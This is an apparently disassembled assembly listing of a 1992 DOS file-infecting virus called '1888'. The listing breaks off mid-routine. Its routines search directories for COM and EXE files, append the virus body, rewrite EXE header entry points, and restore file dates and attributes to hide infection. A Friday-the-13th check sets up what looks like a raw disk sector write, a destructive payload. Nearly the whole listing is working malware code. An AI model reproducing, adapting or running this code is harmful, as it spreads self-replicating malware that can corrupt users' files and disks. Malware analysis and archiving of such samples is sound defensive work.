
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        1888				         €€
;€€								         €€
;€€      Created:   28-Jul-92					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

d_0040_001C_e	equ	1Ch
d_0040_004A_e	equ	4Ah
d_8B38_0003_e	equ	3			;*
data_0012_e	equ	12h
data_0016_e	equ	16h
data_00A3_e	equ	0A3h
data_00A7_e	equ	0A7h
data_00A9_e	equ	0A9h
data_00AB_e	equ	0ABh
data_00AF_e	equ	0AFh
data_00B3_e	equ	0B3h
data_00B5_e	equ	0B5h
d_9E01_0000_e	equ	0			;*
d_9E01_0002_e	equ	2			;*
d_9E01_0004_e	equ	4			;*
d_9E01_0008_e	equ	8			;*
d_9E01_0014_e	equ	14h			;*
d_9E01_0016_e	equ	16h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

1888		proc	far

start:
		jmp	loc_0767
data_0103	db	20h
data_0104	dw	86C0h
data_0106	dw	18FCh
data_0108	dw	762h
data_010A	dw	0
data_010C	db	'1888.COM', 0
		db	 00h, 00h, 00h,0A6h
data_0119	dw	25h
data_011B	db	1
data_011C	dw	760h
data_011E	db	0
data_011F	db	0
data_0120	dw	762h
data_0122	dw	760h
data_0124	dw	0FFFEh
data_0126	dw	5369h			; Data table (indexed access)
data_0128	dw	5369h
data_012A	dw	4C97h
data_012C	dd	9E010000h
data_0130	dw	7C8h
data_0132	db	8
data_0133	db	10h
data_0134	db	0
data_0135	db	10h
		db	0, 0, 0, 0
data_013A	db	'\DANGER\1888'
		db	20 dup (0)
data_015A	db	'C:\', 0
		db	'*', 0
		db	'NETWARE', 0
		db	'LMS', 0
		db	'MAUS', 0
		db	'MDB', 0
		db	'DOS', 0
		db	'BASE', 0
		db	'L', 0
data_0180	dw	160h
data_0182	db	0
data_0183	db	1
		db	 14h, 17h, 6Eh, 00h, 01h,0A9h
		db	 00h, 01h,0BFh
		db	38h
data_018E	db	2Ah
		db	 2Eh, 65h, 78h, 65h, 00h
data_0194	db	2Ah
		db	 2Eh, 63h, 6Fh, 6Dh, 00h
data_019A	db	0
data_019B	db	0
data_019C	db	0
data_019D	db	4
		db	3Fh
		db	7 dup (3Fh)
		db	 43h, 4Fh, 4Dh, 23h, 04h, 00h
		db	0F3h, 31h, 0Dh, 4Dh, 18h, 68h
		db	 20h,0C0h, 86h,0FCh, 18h, 62h
		db	 07h, 00h, 00h
		db	'1888.COM'
		db	 00h, 00h, 00h, 00h,0A6h,0EAh
		db	0AAh, 03h, 00h,0CCh,0AAh, 03h
		db	 60h, 07h, 00h, 40h, 05h, 00h
		db	 60h, 07h, 00h, 01h,0C8h, 01h
		db	 19h, 01h, 00h, 00h, 69h, 53h
		db	 69h, 53h, 61h, 06h, 9Dh, 04h
		db	 16h, 32h, 21h, 00h, 7Bh, 1Ah
		db	 12h, 32h,0ADh, 04h, 69h, 53h
		db	 12h, 32h,0DEh, 07h

1888		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_01F7	proc	near
		cmp	data_011C,0
		jne	loc_0207		; Jump if not equal
		mov	ax,760h
		mov	data_011C,ax
		mov	data_0120,ax
loc_0207:
		mov	al,data_011E
		mov	data_011F,al
		mov	ax,data_0120
		mov	data_0122,ax
		inc	data_0119
		mov	data_019C,0
		mov	data_019A,0
		mov	data_019B,0
		retn
sub_01F7	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0227	proc	near
		lea	dx,data_0183		; Load effective addr
		xor	al,al			; Zero register
		mov	ah,3Dh			; '='
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_ret_0239		; Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle

loc_ret_0239:
		retn
sub_0227	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_023A	proc	near
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		mov	ah,dh
		cmp	cx,data_0130
		je	loc_0249		; Jump if equal
		add	ah,0Ch
loc_0249:
		sub	ah,data_0132
		mov	data_011B,ah
		mov	data_0134,al
		mov	data_0133,dl
		mov	data_0132,dh
		mov	data_0130,cx
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	data_0135,ch
		retn
sub_023A	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0269	proc	near
		mov	ax,es
		dec	ax
		push	es
		mov	es,ax
		mov	ax,es:d_8B38_0003_e
		mov	data_012A,ax
		pop	es
		mov	bx,ax
		sub	bx,200h
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		mov	bx,150h
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		mov	word ptr data_012C+2,ax
		retn
sub_0269	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_028C	proc	near
		push	es
		mov	ax,word ptr data_012C+2
		mov	es,ax
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	ax,data_0128
		mov	es,ax
		mov	bx,data_012A
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		pop	es
		retn
sub_028C	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_02A5	proc	near
		push	ds
		mov	ah,1Bh
		int	21h			; DOS Services  ah=function 1Bh
						;  get disk info, default drive
						;   al=sectors per cluster
						;   ds:bx=ptr to media ID byte
						;   cx=sector size, dx=clusters
		cmp	byte ptr [bx],0F8h
		pop	ds
		retn
sub_02A5	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_02AF	proc	near
		lea	si,data_019D		; Load effective addr
		mov	di,si
		xor	dl,dl			; Zero register
		mov	ah,47h			; 'G'
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
						;   ds:si=ASCIIZ directory name
		mov	cx,30h
		mov	al,0
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,di
		sub	cx,si
		lea	di,data_013A		; ('\DANGER\1888') Load effective addr
		mov	al,5Ch			; '\'
		stosb				; Store al to es:[di]
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		retn
sub_02AF	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_02D0	proc	near
		mov	data_0182,0
		lea	bx,cs:[160h]		; Load effective addr
		add	bx,20h
		mov	data_0180,bx
		sub	bx,20h
		lea	dx,data_015A+4		; ('*') Load effective addr
		mov	cx,33h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_031F		; Jump if carry Set
loc_02F0:
		lea	di,data_019D		; Load effective addr
		add	di,1Eh
		cmp	byte ptr [di],2Eh	; '.'
		je	loc_0319		; Jump if equal
		mov	si,di
		mov	cx,20h
		mov	al,0
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,di
		sub	cx,si
		mov	di,bx
		add	bx,cx
		cmp	bx,data_0180
		ja	loc_031F		; Jump if above
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		inc	data_0182
loc_0319:
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_02F0		; Jump if carry=0
loc_031F:
		lea	bx,cs:[160h]		; Load effective addr
		mov	data_0180,bx
		retn
sub_02D0	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0328	proc	near
		cmp	data_0182,0
		je	loc_ret_034C		; Jump if equal
		lea	dx,data_013A		; ('\DANGER\1888') Load effective addr
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	dx,data_0180
		mov	di,dx
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	al,0
		mov	cx,20h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	data_0180,di

loc_ret_034C:
		retn
sub_0328	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_034D	proc	near
		mov	ax,data_0104
		and	al,1Fh
		cmp	al,1Eh
		retn
sub_034D	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0355	proc	near
		lea	dx,data_0194		; Load effective addr
		cmp	data_011E,0
		je	loc_0364		; Jump if equal
		lea	dx,data_018E		; Load effective addr
loc_0364:
		mov	cx,23h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		retn
sub_0355	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_036C	proc	near
		lea	si,data_019D		; Load effective addr
		add	si,15h
		lea	di,data_0103		; Load effective addr
		mov	cx,16h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		retn
sub_036C	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_037D	proc	near
		pushf				; Push flags
		mov	cx,data_0104
		or	cl,1Fh
		and	cl,0FEh
		mov	dx,data_0106
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		lea	dx,data_010C		; ('1888.COM') Load effective addr
		xor	ch,ch			; Zero register
		mov	cl,data_0103
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		popf				; Pop flags
		retn
sub_037D	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_03A6	proc	near
		lea	dx,data_010C		; ('1888.COM') Load effective addr
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jc	loc_ret_03BA		; Jump if carry Set
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax

loc_ret_03BA:
		retn
sub_03A6	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_03BB	proc	near
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		mov	cx,100h
		xor	dx,dx			; Zero register
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		cmp	word ptr ds:d_9E01_0000_e,5A4Dh
		nop				;*ASM fixup - sign extn byte
		je	loc_03D6		; Jump if equal
		stc				; Set carry flag
		jmp	loc_0455
loc_03D6:
		call	sub_0457
		push	ax
		mov	ax,di
		and	ax,0Fh
		mov	cx,10h
		xor	dx,dx			; Zero register
		sub	cx,ax
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jnc	loc_03EF		; Jump if carry=0
		jmp	short loc_0455
		db	90h
loc_03EF:
		mov	si,ax
		mov	cx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_0455		; Jump if carry Set
		pop	dx
		mov	ax,di
		add	ax,si
		add	ax,100h
		cmp	ax,200h
		jb	loc_040B		; Jump if below
		and	ax,1FFh
		inc	dx
loc_040B:
		mov	cl,4
		shr	ax,cl			; Shift w/zeros fill
		dec	dx
		mov	cl,5
		shl	dx,cl			; Shift w/zeros fill
		sub	dx,ds:d_9E01_0008_e
		add	ax,dx
		sub	ax,10h
		mov	ds:d_9E01_0016_e,ax
		mov	word ptr ds:d_9E01_0014_e,100h
		push	ds
		mov	ax,cs
		mov	ds,ax
		mov	cx,data_011C
		mov	dx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		pop	ds
		jc	loc_0455		; Jump if carry Set
		call	sub_0457
		mov	ds:d_9E01_0002_e,di
		mov	ds:d_9E01_0004_e,ax
		mov	ax,4200h
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_0455		; Jump if carry Set
		mov	cx,100h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_0455:
		pop	ds
		retn
sub_03BB	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0457	proc	near
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	di,ax
		and	di,1FFh
		mov	cl,9
		shr	ax,cl			; Shift w/zeros fill
		mov	cl,7
		shl	dx,cl			; Shift w/zeros fill
		add	ax,dx
		inc	ax
		retn
sub_0457	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0472	proc	near
		mov	ax,data_0108
		mov	data_0120,ax
		mov	cx,data_011C
		cmp	cx,ax
		jb	loc_0488		; Jump if below
		mov	data_0120,cx
		mov	cx,data_0108
loc_0488:
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		xor	dx,dx			; Zero register
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		pop	ds
		jc	loc_ret_04DD		; Jump if carry Set
		mov	ax,4200h
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_ret_04DD		; Jump if carry Set
		mov	dx,100h
		mov	cx,data_011C
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		int	3			; Debug breakpoint
		cmp	ax,cs:data_0108
		ja	loc_04CC		; Jump if above
		mov	ax,4200h
		mov	dx,data_0108
		mov	data_0120,dx
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_ret_04DD		; Jump if carry Set
		mov	cx,data_011C
		jmp	short loc_04D0
loc_04CC:
		mov	cx,data_0108
loc_04D0:
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		pop	ds

loc_ret_04DD:
		retn
sub_0472	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_04DE	proc	near
		cmp	data_011B,2
		ja	loc_04E8		; Jump if above
		xor	ax,ax			; Zero register
		retn
loc_04E8:
		mov	al,data_0133
		and	al,1
		retn
sub_04DE	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_04EE	proc	near
		cmp	data_0133,0Fh
		jb	loc_0507		; Jump if below
		mov	al,data_0135
		cmp	al,13h
		jb	loc_0507		; Jump if below
		mov	ax,40h
		mov	es,ax
		mov	byte ptr es:d_0040_004A_e,23h	; '#'
loc_0507:
		cmp	data_0133,0Dh
		jne	loc_ret_0524		; Jump if not equal
		cmp	data_0134,5
		jne	loc_ret_0524		; Jump if not equal
		mov	ax,301h
		mov	cx,1
		mov	dx,50h
		xor	bx,bx			; Zero register
